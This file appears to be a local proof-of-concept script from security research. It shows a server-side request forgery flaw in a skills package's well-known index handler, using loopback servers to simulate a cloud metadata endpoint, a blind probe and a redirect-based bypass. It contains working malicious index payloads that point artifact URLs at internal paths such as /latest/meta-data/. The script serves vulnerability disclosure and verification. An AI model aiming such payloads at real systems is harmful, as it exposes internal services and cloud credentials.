/**
 * C142 local e2e — vercel-labs/skills@1.7.6 (7a5e920)
 * Well-known v0.2.0 index accepts absolute artifact URLs to any host
 * (incl. loopback / link-local). fetch() runs before digest check → SSRF.
 * If digest matches known internal body, content is installed as a skill.
 *
 * Local-only: two loopback HTTP servers. No secrets. No third-party hosts.
 */
import http from 'node:http';
import { createHash } from 'node:crypto';
import { pathToFileURL } from 'node:url';
import { join, dirname } from 'node:path';
import { fileURLToPath } from 'node:url';

const SKILLS_ROOT = '/workspace/bounty-research/src52/skills';
const { WellKnownProvider } = await import(
  pathToFileURL(join(SKILLS_ROOT, 'src/providers/wellknown.ts')).href
);

const INTERNAL_SECRET =
  'INTERNAL_ONLY_MARKER=ami-ssrf-c142-local\n' +
  '---\nname: leaked-meta\ndescription: Simulated cloud metadata body captured via SSRF\n---\n\n# leaked\n';

// Valid skill-md body that also embeds the secret (simulates IMDS JSON wrapped
// or attacker who knows predictable internal response and crafts matching digest).
const INTERNAL_SKILL_BODY = `---
name: leaked-meta
description: Simulated internal service body exfiltrated via unrestricted artifact URL
---

# Internal marker

${INTERNAL_SECRET.trim()}
`;

const DIGEST = `sha256:${createHash('sha256').update(INTERNAL_SKILL_BODY).digest('hex')}`;

function listen(handler) {
  return new Promise((resolve) => {
    const server = http.createServer(handler);
    server.listen(0, '127.0.0.1', () => {
      const { port } = server.address();
      resolve({ server, port, base: `http://127.0.0.1:${port}` });
    });
  });
}

const hits = [];

const internal = await listen((req, res) => {
  hits.push({ kind: 'INTERNAL', method: req.method, url: req.url, time: new Date().toISOString() });
  if (req.url === '/latest/meta-data/' || req.url === '/skill.md') {
    res.writeHead(200, { 'content-type': 'text/markdown; charset=utf-8' });
    res.end(INTERNAL_SKILL_BODY);
    return;
  }
  res.writeHead(404);
  res.end('nope');
});

const indexPayload = {
  $schema: 'https://schemas.agentskills.io/discovery/0.2.0/schema.json',
  skills: [
    {
      name: 'helper',
      type: 'skill-md',
      description: 'Looks like a normal skill; artifact URL is absolute loopback',
      url: `${internal.base}/latest/meta-data/`,
      digest: DIGEST,
    },
  ],
};

const publisher = await listen((req, res) => {
  hits.push({ kind: 'PUBLISHER', method: req.method, url: req.url, time: new Date().toISOString() });
  if (req.url === '/.well-known/agent-skills/index.json') {
    res.writeHead(200, { 'content-type': 'application/json' });
    res.end(JSON.stringify(indexPayload, null, 2));
    return;
  }
  res.writeHead(404);
  res.end('no index');
});

// Case B: wrong digest still triggers fetch (blind SSRF)
const blindHits = [];
const blindInternal = await listen((req, res) => {
  blindHits.push({ method: req.method, url: req.url, headers: { host: req.headers.host } });
  res.writeHead(200, { 'content-type': 'text/plain' });
  res.end('BLIND_SSRF_BODY_NOT_MATCHING_DIGEST');
});

const blindIndex = {
  $schema: 'https://schemas.agentskills.io/discovery/0.2.0/schema.json',
  skills: [
    {
      name: 'probe',
      type: 'skill-md',
      description: 'Wrong digest — request still sent',
      url: `${blindInternal.base}/probe`,
      digest: 'sha256:' + '0'.repeat(64),
    },
  ],
};

const blindPublisher = await listen((req, res) => {
  if (req.url === '/.well-known/agent-skills/index.json') {
    res.writeHead(200, { 'content-type': 'application/json' });
    res.end(JSON.stringify(blindIndex));
    return;
  }
  res.writeHead(404);
  res.end();
});

const provider = new WellKnownProvider();

console.log('=== C142 skills well-known unrestricted artifact URL SSRF ===');
console.log('skills HEAD:', '7a5e920bead4b1039a6d6df5d7e1163b7b09423a');
console.log('publisher:', publisher.base);
console.log('internal (sim IMDS):', internal.base);
console.log('digest of internal body:', DIGEST);

// Case A: digest matches → skill created from internal body
const skill = await provider.fetchSkill(publisher.base);
const installedContent =
  skill && skill.files ? skill.files.get('SKILL.md') ?? skill.content : null;

const caseA = {
  ok: Boolean(skill && typeof installedContent === 'string' && installedContent.includes('INTERNAL_ONLY_MARKER')),
  skillName: skill?.name,
  installName: skill?.installName,
  sourceUrl: skill?.sourceUrl,
  contentIncludesMarker: typeof installedContent === 'string' && installedContent.includes('INTERNAL_ONLY_MARKER'),
  contentPreview: typeof installedContent === 'string' ? installedContent.slice(0, 180) : null,
  internalHits: hits.filter((h) => h.kind === 'INTERNAL'),
};

console.log('\n--- Case A: absolute artifact URL → loopback, digest match → install ---');
console.log(JSON.stringify(caseA, null, 2));

// Case B: blind SSRF
const blindSkill = await provider.fetchSkill(blindPublisher.base);
const caseB = {
  skillReturned: Boolean(blindSkill),
  blindInternalHits: blindHits,
  note: 'fetchArtifactSkillByEntry calls fetch() before digest check; mismatch returns null but request already hit loopback',
};

console.log('\n--- Case B: wrong digest still hits internal (blind SSRF) ---');
console.log(JSON.stringify(caseB, null, 2));

// Case C: redirect from publisher path to internal
const redirectHits = [];
const redirectInternal = await listen((req, res) => {
  redirectHits.push({ url: req.url });
  res.writeHead(200, { 'content-type': 'text/markdown' });
  res.end(INTERNAL_SKILL_BODY);
});
const redirectPublisher = await listen((req, res) => {
  if (req.url === '/.well-known/agent-skills/index.json') {
    const idx = {
      $schema: 'https://schemas.agentskills.io/discovery/0.2.0/schema.json',
      skills: [
        {
          name: 'redir',
          type: 'skill-md',
          description: 'Same-origin looking url that 302s to loopback sibling',
          url: '/.well-known/agent-skills/payload.md',
          digest: DIGEST,
        },
      ],
    };
    res.writeHead(200, { 'content-type': 'application/json' });
    res.end(JSON.stringify(idx));
    return;
  }
  if (req.url === '/.well-known/agent-skills/payload.md') {
    res.writeHead(302, { Location: `${redirectInternal.base}/meta` });
    res.end();
    return;
  }
  res.writeHead(404);
  res.end();
});

const skillC = await provider.fetchSkill(redirectPublisher.base);
const caseC = {
  ok: Boolean(skillC && (skillC.content || skillC.files?.get('SKILL.md') || '').includes?.('INTERNAL_ONLY_MARKER') ||
    (typeof skillC?.files?.get('SKILL.md') === 'string' && skillC.files.get('SKILL.md').includes('INTERNAL_ONLY_MARKER'))),
  sourceUrl: skillC?.sourceUrl,
  redirectInternalHits: redirectHits,
  contentHasMarker:
    typeof skillC?.files?.get('SKILL.md') === 'string' &&
    skillC.files.get('SKILL.md').includes('INTERNAL_ONLY_MARKER'),
};

console.log('\n--- Case C: same-origin relative url → 302 to other loopback host ---');
console.log(JSON.stringify(caseC, null, 2));

const summary = {
  caseA_installFromInternal: caseA.ok,
  caseB_blindHit: blindHits.length > 0 && !caseB.skillReturned,
  caseC_redirectFollow: caseC.contentHasMarker === true,
  verdict:
    caseA.ok && blindHits.length > 0
      ? 'CONFIRMED: unrestricted artifact URL + pre-digest fetch = SSRF; matching digest installs internal body as skill'
      : 'INCOMPLETE',
};

console.log('\n=== SUMMARY ===');
console.log(JSON.stringify(summary, null, 2));

await new Promise((r) => publisher.server.close(r));
await new Promise((r) => internal.server.close(r));
await new Promise((r) => blindPublisher.server.close(r));
await new Promise((r) => blindInternal.server.close(r));
await new Promise((r) => redirectPublisher.server.close(r));
await new Promise((r) => redirectInternal.server.close(r));

process.exit(summary.verdict.startsWith('CONFIRMED') ? 0 : 1);
